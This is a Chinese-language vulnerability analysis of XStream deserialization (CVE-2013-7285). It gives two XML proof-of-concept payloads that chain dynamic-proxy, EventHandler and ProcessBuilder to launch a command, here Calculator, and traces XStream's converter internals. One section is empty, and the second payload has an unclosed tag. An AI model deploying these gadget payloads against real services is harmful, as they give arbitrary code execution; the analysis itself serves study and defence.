## XStream反序列化

### CVE-2013-7285
* Affected Version <= 1.4.6 (and 1.4.10)  
* POC
```
<sorted-set>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>open</string>
                    <string>/System/Applications/Calculator.app</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

* #### POC拆解
动态代理（在运行期间动态创建接口对象）。demo如下，Hello是要实现的接口。hello.morning会自动调用InvocationHandler.invoke
```
InvocationHandler handler = new InvocationHandler() {
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {...}
};

Hello hello = (Hello) Proxy.newProxyInstance(
    Hello.class.getClassLoader(), // 传入ClassLoader
    new Class[] { Hello.class }, // 传入要实现的接口
    handler); // 传入处理调用方法的InvocationHandler
hello.morning("Bob");
```
poc的动态代理写法，compareTo会自动调用EventHandler.invoke
```
EventHandler ih = new EventHandler(new java.lang.ProcessBuilder("open","/System/Applications/Calculator.app"),"start",null,null);
Comparable cp = (Comparable) Proxy.newProxyInstance(Comparable.class.getClassLoader(),new Class[] { Comparable.class },ih);
cp.compareTo(null);
```
上述Java对象调用过程如何转换成xml？
外层，动态代理对象Proxy.newProxyInstance参数，官方也给出了动态代理转换Converter的Demo，即xml对应interface和InvocationHandler参数，类需要采用全限定类名
```
public static Object newProxyInstance(ClassLoader loader,Class<?>[] interfaces,InvocationHandler h)

<dynamic-proxy>
  <interface>java.lang.Comparable</interface>
  <handler class="java.beans.EventHandler">
    ...
  </handler>
</dynamic-proxy>
```
内层，EventHandler构造函数赋值了该类的四个属性，后两个参数值传入的null，前两个按照target和action标签生成
```
public EventHandler(Object target, String action, String eventPropertyName, String listenerMethodName) {
  this.target = target;
  this.action = action;      
  this.eventPropertyName = eventPropertyName;
  this.listenerMethodName = listenerMethodName;
}

<target class="java.lang.ProcessBuilder">
  ...
</target>
<action>start</action>
```
最内层，传入ProcessBuilder，赋值的是该类的command属性。所以对应xml标签是command
```
public ProcessBuilder(String... command) {
    this.command = new ArrayList<>(command.length);
    for (String arg : command)
        this.command.add(arg);
}

<command>
    <string>open</string>
    <string>/System/Applications/Calculator.app</string>
</command>
```

* #### 漏洞成因
xml的解析也就是反序列化过程，用fromXML()方法作为入口。重点在于标签的解析。（1）标签与类、类属性之间的转换 （2）标签属性与类属性值的转换。
反序列化过程最核心的两步: 
```
# (1)
Class type = HierarchicalStreams.readClassType(this.reader, this.mapper);  // 获取标签; realClass查找标签对应的接口和类;  "interface java.util.SortedSet"
Object result = this.convertAnother((Object)null, type);  // 根据type接口查/类找其实现类; 然后根据实现类找到对应的Converter; 
```
具体看一下`converAnother()`方法，实际上就是根据标签的类型找到其实现类，进而找到处理该类的转换器，进行具体反序列化过程
```
# (2)
public Object convertAnother(Object parent, Class type, Converter converter) {
    type = this.mapper.defaultImplementationOf(type);   // type对应的实现类 "class java.util.TreeSet"
    if (converter == null) {
        converter = this.converterLookup.lookupConverterForType(type);  //转换器 TreeSetConverter
    } ...
    return this.convert(parent, type, converter);  // 进入到转换器的unmarshal方法，如TreeSetConverter.unmarshal
}
```
对于这个POC来说，TreeSetConverter.unmarshal方法中有如下一行代码，表明TreeSetConverter实际用了treeMapConverter对comparator进行解析。所以另一种poc是用`tree-map`标签替换了`sorted-set`标签
```
this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);  // -> this.putCurrentEntryIntoMap(reader, context, result, sortedMap);
```
这一行的实际调用代码如下
```
# (3)
protected void putCurrentEntryIntoMap(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, Map target) {
    Object key = this.readItem(reader, context, map); // 这一步和(1)中的代码一样，对子标签开始上述反序列化过程。上述poc中的子标签是dynamic-proxy，对应转换器就是DynamicProxyConverter
    target.put(key, key);
}
```
这里解析一下DynamicProxyConverter的unmarshal过程
```

```

* #### POC2
```
<tree-map>
    <entry>
        <string>fookey</string>
        <string>foovalue</string>
    </entry>
    <entry>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command>
                        <string>open</string>
                        <string>/System/Applications/Calculator.app</string>
                    </command>
                <action>start</action>
            </handler>
        </dynamic-proxy>
        <string>good</string>
    </entry>
</tree-map>
```
